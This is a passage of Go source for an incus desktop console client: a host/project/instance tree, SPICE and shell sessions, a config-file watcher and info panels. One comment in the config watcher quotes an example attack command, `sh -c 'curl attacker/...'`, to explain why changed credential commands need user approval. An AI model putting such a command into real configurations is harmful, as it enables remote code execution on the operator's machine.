// incus-console — cross-platform Go console client for incus.
//
// Single-window layout: left sidebar is a tree of Host → Project →
// Instance; clicking an instance opens a SPICE session (VMs) or an
// interactive shell (containers) in the main pane. Sessions stay alive
// across selections — clicking another instance parks the current one
// and shows the target, clicking back returns you to the live session
// without re-handshaking.
package main

import (
	"context"
	"fmt"
	"log"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"sync"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/driver/desktop"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"

	"github.com/unidoc/spice"
	"github.com/fsnotify/fsnotify"
	"github.com/fyne-io/terminal"

	"github.com/unidoc/incus-console/internal/agent"
	"github.com/unidoc/incus-console/internal/branding"
	"github.com/unidoc/incus-console/internal/config"
	"github.com/unidoc/incus-console/internal/creds"
	"github.com/unidoc/incus-console/internal/driver"
	"github.com/unidoc/incus-console/internal/incus"
)

// sessionKey uniquely identifies a live console session by host + project
// + VM. Used as the map key so double-clicks and re-selections resolve to
// the same session rather than opening a new one.
type sessionKey struct{ host, project, vm string }

func (k sessionKey) String() string {
	return fmt.Sprintf("%s/%s/%s", k.host, k.project, k.vm)
}

// session holds one active console — either a SPICE framebuffer session
// (VM path) or an incus-exec shell (container path). content is the
// widget shown in the main pane; the other fields are nil for whichever
// path we're not on. onFocus is called each time the session becomes
// the visible one — VMs use it to pull focus onto their input surface,
// containers to focus the command entry.
type session struct {
	key sessionKey
	// SPICE (VM) path.
	console *incus.SpiceConsole
	drv     *driver.FyneDriver
	// Shell (container) path.
	shell   *incus.Shell
	content fyne.CanvasObject
	onFocus func()
}

// app state — shared across the tree, the main pane, and all callbacks.
type ui struct {
	fyneApp fyne.App
	window  fyne.Window
	cfg     *config.Config

	// Sidebar tree.
	tree *widget.Tree

	// Main pane — a stack that lets us swap the visible child while
	// keeping the rest cached in memory (i.e. the parked sessions).
	// widget.NewLabel is the placeholder shown when no VM is picked.
	mainPane *container.Split // sidebar | main
	holder   *fyne.Container  // NewStack under the hood, one child visible
	empty    fyne.CanvasObject

	// Cached data. serverCache is per-host; projectCache and vmCache are
	// per-tree-node lookups populated lazily when a node is expanded.
	mu           sync.Mutex
	serverCache  map[string]*incus.Server   // hostName → connected Server
	projectCache map[string][]string        // hostName → projects
	vmCache      map[string][]incus.VM      // hostName+project → vms
	identity     map[string]*incus.Identity // hostName → who we are on this host
	sessions     map[sessionKey]*session

	// Track the most-recently-selected host row so Edit/Delete buttons
	// know what they operate on. Empty means "no host selected".
	lastSelectedHost string

	// activeKey names the session currently visible in the main pane, so
	// the sidebar tree can highlight the right row. Zero-value means
	// "empty-state placeholder is showing".
	activeKey sessionKey
}

// prefKeyThemeVariant is the app-preferences key that stores the user's
// dark/light/system choice. Kept as a package-level const so the
// settings dialog and startup path stay in sync.
const prefKeyThemeVariant = "theme.variant"

func main() {
	a := app.NewWithID("io.unidoc.incus-console")
	a.Settings().SetTheme(branding.Theme{Variant: a.Preferences().String(prefKeyThemeVariant)})
	a.SetIcon(fyne.NewStaticResource("icon.png", branding.Icon))

	cfg, err := config.Load()
	if err != nil {
		log.Printf("incus-console: could not load config: %v (starting empty)", err)
		cfg = &config.Config{}
	}

	u := &ui{
		fyneApp:      a,
		cfg:          cfg,
		serverCache:  make(map[string]*incus.Server),
		projectCache: make(map[string][]string),
		vmCache:      make(map[string][]incus.VM),
		identity:     make(map[string]*incus.Identity),
		sessions:     make(map[sessionKey]*session),
	}
	u.build()
	// Poll VM state every 15 seconds so the sidebar's [Running]/[Stopped]
	// suffixes stay honest without the user hitting Refresh manually.
	// 15s is a compromise: fast enough to feel live, slow enough not to
	// hammer the incus API when many hosts are configured.
	go u.pollLoop(15 * time.Second)
	// Live config reload: when the user edits config.yaml in a text
	// editor (or the "Edit config" button opens it), changes take
	// effect on the next save without a restart.
	go u.watchConfig()
	u.window.ShowAndRun()
}

// watchConfig starts an fsnotify watcher on the config file's directory
// and reloads incus-console's in-memory Config whenever the file
// changes. Watch the DIRECTORY, not the file, because most editors write
// atomically (write to temp, rename over) which triggers a Remove event
// on the file's inode and detaches a file-level watch.
func (u *ui) watchConfig() {
	p, err := config.Path()
	if err != nil {
		log.Printf("incus-console: watch config disabled: %v", err)
		return
	}
	dir := filepath.Dir(p)
	if err := os.MkdirAll(dir, 0o700); err != nil {
		log.Printf("incus-console: watch config disabled: %v", err)
		return
	}
	w, err := fsnotify.NewWatcher()
	if err != nil {
		log.Printf("incus-console: watch config disabled: %v", err)
		return
	}
	defer w.Close()
	if err := w.Add(dir); err != nil {
		log.Printf("incus-console: watch config disabled: %v", err)
		return
	}
	// Debounce: editors often fire several events per save (write,
	// rename, chmod). Coalesce into one reload per quiet-window.
	const debounce = 250 * time.Millisecond
	var timer *time.Timer
	reload := func() {
		fresh, err := config.Load()
		if err != nil {
			log.Printf("incus-console: config reload failed: %v", err)
			u.showError(fmt.Errorf("config reload failed: %w", err))
			return
		}
		// Gate command-source changes behind an explicit prompt.
		// Command sources shell-exec whatever the user configured, so
		// an attacker who briefly held write access to config.yaml
		// could otherwise turn the fsnotify watcher into an RCE
		// channel by replacing TLSClientCertCommand with, e.g.,
		// `sh -c 'curl attacker/...'`. Merging (added/removed/
		// changed hosts) is safe by itself — the change to a command
		// only bites on the NEXT connect — but we surface it now so
		// the operator explicitly consents.
		u.mu.Lock()
		suspicious := suspiciousCommandDiff(u.cfg.Hosts, fresh.Hosts)
		u.mu.Unlock()

		apply := func() {
			u.mu.Lock()
			u.cfg.Hosts = fresh.Hosts
			u.cfg.AgentBinaries = fresh.AgentBinaries
			u.mu.Unlock()
			log.Printf("incus-console: config reloaded (%d hosts)", len(fresh.Hosts))
			fyneDo(func() {
				u.tree.Refresh()
				u.showInfo("Config reloaded",
					fmt.Sprintf("%d hosts configured. Changes are live.", len(fresh.Hosts)))
			})
		}

		if len(suspicious) > 0 {
			fyneDo(func() {
				dialog.ShowConfirm("Config change requires approval",
					"The config file was modified on disk and now specifies\n"+
						"different shell commands for these credential sources:\n\n"+
						strings.Join(suspicious, "\n")+
						"\n\nCommand-source credentials shell-execute this text on\n"+
						"the next connect. If you didn't make this change, cancel now\n"+
						"and inspect the file.\n\nApply the new config?",
					func(yes bool) {
						if yes {
							apply()
						} else {
							log.Printf("incus-console: config reload cancelled by user")
						}
					}, u.window)
			})
			return
		}
		apply()
	}
	for {
		select {
		case ev, ok := <-w.Events:
			if !ok {
				return
			}
			if filepath.Clean(ev.Name) != filepath.Clean(p) {
				continue
			}
			if ev.Op&(fsnotify.Write|fsnotify.Create|fsnotify.Rename) == 0 {
				continue
			}
			if timer != nil {
				timer.Stop()
			}
			timer = time.AfterFunc(debounce, reload)
		case err, ok := <-w.Errors:
			if !ok {
				return
			}
			log.Printf("incus-console: config watcher error: %v", err)
		}
	}
}

// clipboardPoll watches the host clipboard for changes and tells the
// guest agent about them via NotifyHostClipboardChanged. Ticks every
// 500 ms — Fyne's clipboard read is a cheap single OS call on every
// supported platform, so the CPU footprint is negligible. Exits when
// the session is closed.
func (u *ui) clipboardPoll(key sessionKey) {
	const interval = 500 * time.Millisecond
	t := time.NewTicker(interval)
	defer t.Stop()
	var lastSeen string
	for range t.C {
		u.mu.Lock()
		s, ok := u.sessions[key]
		u.mu.Unlock()
		if !ok {
			return // session closed
		}
		var current string
		fyne.DoAndWait(func() { current = u.window.Clipboard().Content() })
		if current == lastSeen {
			continue
		}
		// Feedback-loop guard: if this content is exactly what the guest
		// just sent to us (VM→Mac direction), don't ping the guest right
		// back with "you have new clipboard!". Guest agent already knows.
		if current == s.drv.LastGuestClipboard() {
			lastSeen = current
			continue
		}
		lastSeen = current
		s.drv.NotifyHostClipboardChanged()
	}
}

func (u *ui) pollLoop(interval time.Duration) {
	t := time.NewTicker(interval)
	defer t.Stop()
	for range t.C {
		u.mu.Lock()
		type job struct{ host, project string }
		var jobs []job
		for k := range u.vmCache {
			if slash := strings.IndexByte(k, '/'); slash > 0 {
				jobs = append(jobs, job{host: k[:slash], project: k[slash+1:]})
			}
		}
		u.mu.Unlock()
		for _, j := range jobs {
			u.fetchVMs(j.host, j.project)
		}
	}
}

// --- Layout -------------------------------------------------------------

func (u *ui) build() {
	u.window = u.fyneApp.NewWindow("incus-console")
	u.window.Resize(fyne.NewSize(1280, 800))

	// Empty-state placeholder for the main pane — shows the app icon,
	// the tool name, a short instruction, and a UniDoc credit line as a
	// clickable link. Doubles as the About screen for the app.
	u.empty = buildEmptyState(u.fyneApp)
	u.holder = container.NewStack(u.empty)

	// Sidebar tree.
	u.tree = widget.NewTree(u.treeChildIDs, u.treeIsBranch, u.treeCreateNode, u.treeUpdateNode)
	u.tree.OnSelected = u.treeSelected

	// Sidebar toolbar (Add / Edit / Delete host + Refresh).
	addBtn := widget.NewButton("Add…", func() { u.showHostForm(nil) })
	editBtn := widget.NewButton("Edit…", func() {
		if h := u.selectedHost(); h != nil {
			u.showHostForm(h)
		}
	})
	delBtn := widget.NewButton("Delete", func() {
		if h := u.selectedHost(); h != nil {
			u.confirmDeleteHost(h)
		}
	})
	refreshBtn := widget.NewButton("Refresh", func() {
		u.mu.Lock()
		u.projectCache = make(map[string][]string)
		u.vmCache = make(map[string][]incus.VM)
		u.mu.Unlock()
		u.tree.Refresh()
	})
	// Overflow menu — keeps the primary row (Add/Edit/Delete/Refresh)
	// visible while the low-frequency actions (Info, Edit config,
	// Settings) hide behind a "…" button.
	moreBtn := widget.NewButtonWithIcon("", theme.MoreVerticalIcon(), nil)
	moreBtn.OnTapped = func() {
		menu := fyne.NewMenu("",
			fyne.NewMenuItem("Info panel for selection", u.showSelectedInfo),
			fyne.NewMenuItem("Edit config file", u.openConfigFile),
			fyne.NewMenuItem("Toggle dark / light", u.toggleTheme),
			fyne.NewMenuItem("Settings…", u.showSettingsDialog),
		)
		// Anchor the popup below-right of the button so it doesn't
		// land offscreen when the sidebar is narrow.
		pos := fyne.CurrentApp().Driver().AbsolutePositionForObject(moreBtn)
		pos = pos.Add(fyne.NewPos(0, moreBtn.Size().Height))
		widget.ShowPopUpMenuAtPosition(menu, u.window.Canvas(), pos)
	}

	sidebar := container.NewBorder(
		nil,
		container.NewVBox(
			container.NewHBox(addBtn, editBtn, delBtn, layout.NewSpacer(), refreshBtn, moreBtn),
		),
		nil, nil,
		u.tree,
	)

	u.mainPane = container.NewHSplit(sidebar, u.holder)
	u.mainPane.SetOffset(0.22) // sidebar ~22%
	u.window.SetContent(u.mainPane)

	// Wire keyboard at the window level so whichever session is on-screen
	// receives keys without needing per-session focus juggling.
	if dc, ok := u.window.Canvas().(desktop.Canvas); ok {
		dc.SetOnKeyDown(func(e *fyne.KeyEvent) {
			if s := u.currentSession(); s != nil && s.drv != nil {
				s.drv.SendKey(e.Name, true)
			}
		})
		dc.SetOnKeyUp(func(e *fyne.KeyEvent) {
			if s := u.currentSession(); s != nil && s.drv != nil {
				s.drv.SendKey(e.Name, false)
			}
		})
	}

	u.window.SetOnClosed(func() {
		u.mu.Lock()
		for _, s := range u.sessions {
			if s.console != nil {
				_ = s.console.Close()
			}
			if s.shell != nil {
				_ = s.shell.Close()
			}
		}
		u.mu.Unlock()
	})
}

// currentSession returns the session currently rendered in the main pane,
// if any. Used by the key hook to route events to the right VM.
func (u *ui) currentSession() *session {
	u.mu.Lock()
	defer u.mu.Unlock()
	// The stack's visible child is the LAST one — we push the target
	// session on top when the user selects it.
	if len(u.holder.Objects) == 0 {
		return nil
	}
	top := u.holder.Objects[len(u.holder.Objects)-1]
	for _, s := range u.sessions {
		if s.content == top {
			return s
		}
	}
	return nil
}

// --- Tree callbacks -----------------------------------------------------

// Node ID scheme:
//
//	""                     — root
//	"host:<name>"          — host branch
//	"proj:<host>:<name>"   — project branch under host
//	"vm:<host>:<proj>:<n>" — VM leaf under project
func (u *ui) treeChildIDs(id widget.TreeNodeID) []widget.TreeNodeID {
	if id == "" {
		out := make([]widget.TreeNodeID, len(u.cfg.Hosts))
		for i, h := range u.cfg.Hosts {
			out[i] = "host:" + h.Name
		}
		return out
	}
	kind, rest := splitID(id)
	switch kind {
	case "host":
		host := u.cfg.Host(rest)
		if host == nil {
			return nil
		}
		u.mu.Lock()
		projects, ok := u.projectCache[host.Name]
		u.mu.Unlock()
		if !ok {
			// Async fetch — refresh tree when it lands.
			go u.fetchProjects(*host)
			return []widget.TreeNodeID{"loading:" + host.Name}
		}
		out := make([]widget.TreeNodeID, len(projects))
		for i, p := range projects {
			out[i] = fmt.Sprintf("proj:%s:%s", host.Name, p)
		}
		return out
	case "proj":
		hostName, project, ok := splitHostProj(rest)
		if !ok {
			return nil
		}
		u.mu.Lock()
		vms, cached := u.vmCache[hostName+"/"+project]
		u.mu.Unlock()
		if !cached {
			go u.fetchVMs(hostName, project)
			return []widget.TreeNodeID{"loading:" + hostName + "/" + project}
		}
		out := make([]widget.TreeNodeID, len(vms))
		for i, vm := range vms {
			out[i] = fmt.Sprintf("vm:%s:%s:%s", hostName, project, vm.Name)
		}
		return out
	}
	return nil
}

func (u *ui) treeIsBranch(id widget.TreeNodeID) bool {
	// Root ("") must be reported as a branch so Fyne walks into ChildUIDs("")
	// and renders the top-level host list. Without this the tree is silently
	// empty even with a populated config.
	if id == "" {
		return true
	}
	kind, _ := splitID(id)
	return kind == "host" || kind == "proj"
}

func (u *ui) treeCreateNode(_ bool) fyne.CanvasObject {
	return widget.NewLabel("")
}

func (u *ui) treeUpdateNode(id widget.TreeNodeID, _ bool, obj fyne.CanvasObject) {
	l := obj.(*widget.Label)
	// Default: no styling. Reset every time so a previously-active row
	// snaps back to normal when we swap active session.
	l.TextStyle = fyne.TextStyle{}
	kind, rest := splitID(id)
	switch kind {
	case "host":
		u.mu.Lock()
		id := u.identity[rest]
		u.mu.Unlock()
		label := "🖥️  " + rest
		if id != nil {
			suffix := ""
			switch {
			case id.Restricted && len(id.Projects) > 0:
				suffix = " · " + id.ServerType + " · restricted (" + strings.Join(id.Projects, ",") + ")"
			case id.ServerType == "cluster":
				suffix = " · cluster · admin"
			case id.ServerName != "":
				suffix = " · standalone · admin"
			}
			label += suffix
		}
		l.SetText(label)
	case "proj":
		_, project, _ := splitHostProj(rest)
		l.SetText("📁  " + project)
	case "vm":
		host, project, vm, _ := splitHostProjVM(rest)
		// Show status suffix + pick the right icon for VM vs container.
		status := ""
		icon := "💻" // default: VM (fallback when we don't know yet)
		u.mu.Lock()
		// Look up ONLY in this host's project cache — the old code
		// iterated every cached (host, project) pair and picked the
		// first name match, which meant a `web01` in host A's `default`
		// project shadowed host B's identically-named VM. The tree row
		// for host B then rendered host A's status/icon.
		if vms, ok := u.vmCache[host+"/"+project]; ok {
			for _, x := range vms {
				if x.Name == vm {
					status = " [" + x.Status + "]"
					if x.Type == "container" {
						icon = "📦"
					} else {
						icon = "🖥️"
					}
					break
				}
			}
		}
		active := u.activeKey == sessionKey{host: host, project: project, vm: vm}
		_, hasSession := u.sessions[sessionKey{host: host, project: project, vm: vm}]
		u.mu.Unlock()
		// Prefix marker: solid dot for the visible session, hollow dot
		// for other open-but-parked sessions, blank for instances with
		// no session at all. Keeps column alignment consistent.
		marker := "   "
		switch {
		case active:
			marker = "● "
		case hasSession:
			marker = "○ "
		}
		l.SetText(marker + icon + "  " + vm + status)
		if active {
			l.TextStyle = fyne.TextStyle{Bold: true}
		}
	case "loading":
		l.SetText("loading…")
	}
	l.Refresh()
}

func (u *ui) treeSelected(id widget.TreeNodeID) {
	kind, rest := splitID(id)
	// Track which host is under focus so Edit/Delete know their target.
	// A VM/project selection still counts as "this host is highlighted".
	switch kind {
	case "host":
		u.lastSelectedHost = rest
	case "proj":
		if h, _, ok := splitHostProj(rest); ok {
			u.lastSelectedHost = h
		}
	case "vm":
		if h, _, _, ok := splitHostProjVM(rest); ok {
			u.lastSelectedHost = h
		}
	}

	u.tree.Unselect(id)

	// Info-first navigation: clicking a node in the sidebar shows an
	// info panel in the main pane. Explicit "Open console" buttons on
	// instance-info panels launch the SPICE session / container shell.
	// Branches (host, proj) still expand/collapse via Fyne's default
	// behaviour; the info panel is a bonus, not a replacement.
	switch kind {
	case "host":
		go u.showHostInfo(rest)
	case "proj":
		if h, p, ok := splitHostProj(rest); ok {
			go u.showProjectInfo(h, p)
		}
	case "vm":
		hostName, project, vmName, ok := splitHostProjVM(rest)
		if !ok {
			return
		}
		go u.showInstanceInfo(hostName, project, vmName)
	}
}

// --- Async fetches ------------------------------------------------------

func (u *ui) fetchProjects(h config.Host) {
	srv, err := u.serverFor(h)
	if err != nil {
		log.Printf("incus-console: connect %s: %v", h.Name, err)
		return
	}
	// Fire off a whoami in the background — best-effort, we render the
	// tree row even without it. Feeds the "cluster / restricted-to X"
	// suffix on the host row.
	go func() {
		if id, err := srv.WhoAmI(); err == nil && id != nil {
			u.mu.Lock()
			u.identity[h.Name] = id
			u.mu.Unlock()
			fyneDo(func() { u.tree.Refresh() })
		}
	}()
	projects, err := srv.ListProjects()
	if err != nil {
		log.Printf("incus-console: list projects on %s: %v", h.Name, err)
		return
	}
	sort.Strings(projects)
	u.mu.Lock()
	u.projectCache[h.Name] = projects
	u.mu.Unlock()
	fyneDo(func() { u.tree.Refresh() })
}

func (u *ui) fetchVMs(hostName, project string) {
	host := u.cfg.Host(hostName)
	if host == nil {
		return
	}
	srv, err := u.serverFor(*host)
	if err != nil {
		log.Printf("incus-console: connect %s: %v", hostName, err)
		return
	}
	vms, err := srv.ListVMsInProject(project)
	if err != nil {
		log.Printf("incus-console: list VMs on %s/%s: %v", hostName, project, err)
		return
	}
	sort.Slice(vms, func(i, j int) bool { return vms[i].Name < vms[j].Name })
	u.mu.Lock()
	u.vmCache[hostName+"/"+project] = vms
	u.mu.Unlock()
	fyneDo(func() { u.tree.Refresh() })
}

// serverFor returns a (cached) connected incus.Server for the host.
func (u *ui) serverFor(h config.Host) (*incus.Server, error) {
	u.mu.Lock()
	srv, ok := u.serverCache[h.Name]
	u.mu.Unlock()
	if ok {
		return srv, nil
	}
	srv, err := incus.Connect(context.Background(), incus.Config{
		URL:     h.URL,
		Project: h.Project,
		ClientCert: creds.Source{
			KeychainAccount: h.TLSClientCertKeychain,
			Command:         h.TLSClientCertCommand,
			FilePath:        h.TLSClientCert,
		},
		ClientKey: creds.Source{
			KeychainAccount: h.TLSClientKeyKeychain,
			Command:         h.TLSClientKeyCommand,
			FilePath:        h.TLSClientKey,
		},
		TLSServerCert: h.TLSServerCert,
	})
	if err != nil {
		return nil, err
	}
	u.mu.Lock()
	u.serverCache[h.Name] = srv
	u.mu.Unlock()
	return srv, nil
}

// --- Session management ------------------------------------------------

// openOrFocus surfaces an existing session in the main pane or starts a
// new one. Existing sessions keep their SPICE state — no re-handshake.
func (u *ui) openOrFocus(h config.Host, project, vmName string) {
	key := sessionKey{host: h.Name, project: project, vm: vmName}
	u.mu.Lock()
	s, exists := u.sessions[key]
	u.mu.Unlock()
	if exists {
		u.showInPane(s.content, key)
		if s.onFocus != nil {
			s.onFocus()
		}
		return
	}
	// Look up the instance type so we route containers to the shell
	// session path — VMs have SPICE framebuffers, containers do not.
	u.mu.Lock()
	var isContainer bool
	for _, vms := range u.vmCache {
		for _, x := range vms {
			if x.Name == vmName && x.Project == project && x.Type == "container" {
				isContainer = true
				break
			}
		}
	}
	u.mu.Unlock()

	// Show a loading placeholder immediately so the user sees the pane
	// react to the click — connect + handshake can take several seconds.
	u.showInPane(buildLoadingPane(key, isContainer), key)

	if isContainer {
		go u.startContainerSession(h, key)
		return
	}
	go u.startSession(h, key)
}

// --- Info panels --------------------------------------------------------
//
// Info-first navigation: clicking a node in the sidebar shows what the
// node IS in the main pane. Console launch is a deliberate second
// step (button on the instance-info panel). Keeps operators from
// accidentally kicking off a SPICE handshake when they just wanted
// to see whether a VM is running.

// showHostInfo renders identity + cluster + project overview for one
// host in the main pane.
func (u *ui) showHostInfo(hostName string) {
	h := u.cfg.Host(hostName)
	if h == nil {
		return
	}
	srv, err := u.serverFor(*h)
	if err != nil {
		u.showInPane(errorCard("Connect to "+hostName, err), sessionKey{})
		return
	}
	id, idErr := srv.WhoAmI()

	u.mu.Lock()
	projects := u.projectCache[hostName]
	u.mu.Unlock()

	rows := [][2]string{
		{"Host", hostName},
		{"URL", h.URL},
	}
	if id != nil {
		rows = append(rows, [2]string{"Server", fmt.Sprintf("%s (%s)", id.ServerName, id.ServerType)})
		if id.ServerVersion != "" {
			rows = append(rows, [2]string{"incus version", id.ServerVersion})
		}
		if id.Architecture != "" {
			rows = append(rows, [2]string{"Host arch", id.Architecture})
		}
		if id.Kernel != "" {
			rows = append(rows, [2]string{"Kernel", id.Kernel})
		}
		if id.Fingerprint != "" {
			rows = append(rows, [2]string{"Cert fingerprint", id.Fingerprint})
		}
		if id.Type != "" {
			rows = append(rows, [2]string{"Trust type", id.Type})
		}
		if id.Restricted {
			rows = append(rows, [2]string{"Access", "restricted to projects: " + strings.Join(id.Projects, ", ")})
		} else if id.Fingerprint != "" {
			rows = append(rows, [2]string{"Access", "admin (unrestricted)"})
		}
	} else if idErr != nil {
		rows = append(rows, [2]string{"Whoami error", idErr.Error()})
	}
	rows = append(rows, [2]string{"Projects visible", fmt.Sprintf("%d", len(projects))})

	// Action bar sits directly under the title so operators don't have
	// to hunt for it below a long info table.
	openConfigBtn := widget.NewButtonWithIcon("Edit config", theme.DocumentIcon(), u.openConfigFile)
	refreshBtn := widget.NewButtonWithIcon("Refresh", theme.ViewRefreshIcon(), func() {
		u.mu.Lock()
		delete(u.projectCache, hostName)
		u.mu.Unlock()
		go u.showHostInfo(hostName)
	})
	actions := container.NewHBox(openConfigBtn, refreshBtn)

	// Fyne AppTabs — only used when we have more than one section
	// worth of content. Single-section hosts (standalone, no networks
	// discovered) get a plain vertical layout so we don't add tab
	// chrome for nothing.
	tabs := container.NewAppTabs()
	tabs.Append(container.NewTabItemWithIcon("Info", theme.InfoIcon(),
		container.NewScroll(container.NewPadded(infoTable(rows)))))

	if id != nil && id.ServerType == "cluster" {
		if members, err := srv.ListClusterMembers(); err == nil && len(members) > 0 {
			tabs.Append(container.NewTabItemWithIcon("Cluster", theme.ComputerIcon(),
				container.NewScroll(container.NewPadded(buildClusterMembersTable(members)))))
		}
	}

	// Networks + ACLs share one tab since they describe the same
	// concern (what's on the wire and who can talk to whom). Rendered
	// side-by-side within the tab so both fit without scrolling for
	// small clusters.
	proj := h.Project
	if proj == "" {
		proj = "default"
	}
	nets, netsErr := srv.ListNetworksInProject(proj)
	acls, aclsErr := srv.ListNetworkACLsInProject(proj)
	if (netsErr == nil && len(nets) > 0) || (aclsErr == nil && len(acls) > 0) {
		var netSections []fyne.CanvasObject
		if netsErr == nil && len(nets) > 0 {
			netSections = append(netSections,
				widget.NewLabelWithStyle("Networks · "+proj, fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
				buildNetworksTable(nets),
			)
		}
		if aclsErr == nil && len(acls) > 0 {
			if len(netSections) > 0 {
				netSections = append(netSections, widget.NewSeparator())
			}
			netSections = append(netSections,
				widget.NewLabelWithStyle("Network ACLs · "+proj, fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
				buildACLsTable(acls),
			)
		}
		tabs.Append(container.NewTabItemWithIcon("Networks", theme.MailComposeIcon(),
			container.NewScroll(container.NewPadded(container.NewVBox(netSections...)))))
	}

	tabs.SetTabLocation(container.TabLocationTop)

	// Layout: title bar at top, action row directly below, tabs fill.
	header := container.NewVBox(
		infoTitle(hostName, "🖥️  incus host"),
		container.NewPadded(actions),
	)
	body := container.NewBorder(header, nil, nil, nil, tabs)
	u.showInPane(container.NewPadded(body), sessionKey{})
}

// buildClusterMembersTable renders a single-column-per-member card
// stack — one row per node with the fields an operator would look up
// (status, roles, arch, URL). No actions — this is pure observation.
func buildClusterMembersTable(members []incus.ClusterMember) fyne.CanvasObject {
	var rows [][2]string
	for _, m := range members {
		suffix := ""
		if m.Database {
			suffix = " · database"
		}
		roles := strings.Join(m.Roles, ",")
		if roles == "" {
			roles = "-"
		}
		val := fmt.Sprintf("%s%s · %s · %s", m.Status, suffix, roles, m.Architecture)
		if m.Message != "" && !strings.EqualFold(m.Message, "fully operational") {
			val += " · " + m.Message
		}
		if m.URL != "" {
			val += "  " + m.URL
		}
		rows = append(rows, [2]string{m.Name, val})
	}
	return infoTable(rows)
}

// buildNetworksTable summarises each network on one row: type,
// managed/unmanaged flag, status, and the count of resources using it.
func buildNetworksTable(nets []incus.Network) fyne.CanvasObject {
	var rows [][2]string
	for _, n := range nets {
		managed := "unmanaged"
		if n.Managed {
			managed = "managed"
		}
		status := n.Status
		if status == "" {
			status = "-"
		}
		val := fmt.Sprintf("%s · %s · %s · used by %d", n.Type, managed, status, n.UsedBy)
		rows = append(rows, [2]string{n.Name, val})
	}
	return infoTable(rows)
}

// buildACLsTable summarises each ACL as ingress/egress rule counts
// plus how many resources apply it.
func buildACLsTable(acls []incus.NetworkACL) fyne.CanvasObject {
	var rows [][2]string
	for _, a := range acls {
		val := fmt.Sprintf("%d ingress · %d egress · used by %d", a.Ingress, a.Egress, a.UsedBy)
		if a.Description != "" {
			val = a.Description + "  ·  " + val
		}
		rows = append(rows, [2]string{a.Name, val})
	}
	return infoTable(rows)
}

func (u *ui) showProjectInfo(hostName, project string) {
	u.mu.Lock()
	vms := u.vmCache[hostName+"/"+project]
	u.mu.Unlock()

	running, stopped := 0, 0
	containers, virts := 0, 0
	for _, v := range vms {
		if v.Status == "Running" {
			running++
		} else {
			stopped++
		}
		if v.Type == "container" {
			containers++
		} else {
			virts++
		}
	}

	rows := [][2]string{
		{"Host", hostName},
		{"Project", project},
		{"Instances", fmt.Sprintf("%d (%d running, %d stopped)", len(vms), running, stopped)},
		{"By type", fmt.Sprintf("%d containers, %d VMs", containers, virts)},
	}
	header := container.NewVBox(
		infoTitle(project, "📁  project on "+hostName),
	)
	body := container.NewBorder(header, nil, nil, nil,
		container.NewScroll(container.NewPadded(infoTable(rows))))
	u.showInPane(container.NewPadded(body), sessionKey{})
}

func (u *ui) showInstanceInfo(hostName, project, vmName string) {
	h := u.cfg.Host(hostName)
	if h == nil {
		return
	}
	srv, err := u.serverFor(*h)
	if err != nil {
		u.showInPane(errorCard("Connect to "+hostName, err), sessionKey{})
		return
	}
	// Show a lightweight card immediately while the heavy detail loads.
	u.showInPane(infoLoading(vmName), sessionKey{})

	inst, err := srv.GetInstanceDetail(project, vmName)
	if err != nil {
		u.showInPane(errorCard("Load "+vmName, err), sessionKey{})
		return
	}

	kind := "virtual machine"
	icon := "🖥️"
	if inst.Type == "container" {
		kind = "container"
		icon = "📦"
	}

	rows := [][2]string{
		{"Name", inst.Name},
		{"Status", inst.Status},
		{"Type", inst.Type},
		{"Architecture", inst.Architecture},
		{"Created", inst.CreatedAt.Format("2006-01-02 15:04 MST")},
		{"Last used", inst.LastUsedAt.Format("2006-01-02 15:04 MST")},
	}
	if inst.Config["image.os"] != "" {
		rows = append(rows, [2]string{"Image OS", fmt.Sprintf("%s %s", inst.Config["image.os"], inst.Config["image.release"])})
	}
	if v := inst.Config["limits.cpu"]; v != "" {
		rows = append(rows, [2]string{"CPU limit", v})
	}
	if v := inst.Config["limits.memory"]; v != "" {
		rows = append(rows, [2]string{"Memory limit", v})
	}
	// Networks (from state, best-effort — may be empty for stopped VMs).
	if inst.State != nil {
		for netName, net := range inst.State.Network {
			for _, addr := range net.Addresses {
				if addr.Scope == "global" {
					rows = append(rows, [2]string{netName + " " + addr.Family, addr.Address + "/" + addr.Netmask})
				}
			}
		}
	}

	// Action bar sits directly under the title. Open console is
	// always first (primary action) so it doesn't move around as the
	// state-aware buttons on the right change with instance status.
	actions := u.instanceActionBar(*h, project, vmName, inst.Status,
		inst.Type == "container")

	header := container.NewVBox(
		infoTitle(inst.Name, icon+"  "+kind+" · "+hostName+" / "+project),
		container.NewPadded(actions),
	)
	body := container.NewBorder(header, nil, nil, nil,
		container.NewScroll(container.NewPadded(infoTable(rows))))
	u.showInPane(container.NewPadded(body), sessionKey{})
}

// instanceActionBar renders the horizontal action row shown at the top
// of the instance info panel. "Open console" is the primary action —
// always first, always high-importance. State-aware buttons (Start /
// Stop / Restart / Pause / Resume) sit to the right, so the panel's
// left-most control is stable no matter what status the instance is in.
func (u *ui) instanceActionBar(h config.Host, project, name, status string, isContainer bool) fyne.CanvasObject {
	openLabel := "Open console"
	if isContainer {
		openLabel = "Open shell"
	}
	openBtn := widget.NewButtonWithIcon(openLabel, theme.MediaPlayIcon(), func() {
		u.openOrFocus(h, project, name)
	})
	openBtn.Importance = widget.HighImportance

	// do wires a state-changing action button. If confirmPrompt is
	// non-empty, the action goes through a modal confirm dialog first
	// — used for destructive actions (Force stop, Restart) so a
	// misclick in a room full of open sessions doesn't nuke prod.
	do := func(label string, iconRes fyne.Resource, importance widget.Importance, confirmPrompt string, fn func(*incus.Server) error) *widget.Button {
		btn := widget.NewButtonWithIcon(label, iconRes, nil)
		if importance != widget.MediumImportance {
			btn.Importance = importance
		}
		run := func() {
			btn.Disable()
			go func() {
				srv, err := u.serverFor(h)
				if err != nil {
					u.showError(err)
					return
				}
				if err := fn(srv); err != nil {
					u.showError(err)
					return
				}
				u.mu.Lock()
				delete(u.vmCache, h.Name+"/"+project)
				u.mu.Unlock()
				u.fetchVMs(h.Name, project)
				u.showInstanceInfo(h.Name, project, name)
			}()
		}
		btn.OnTapped = func() {
			if confirmPrompt == "" {
				run()
				return
			}
			dialog.ShowConfirm(
				label+" "+name+"?",
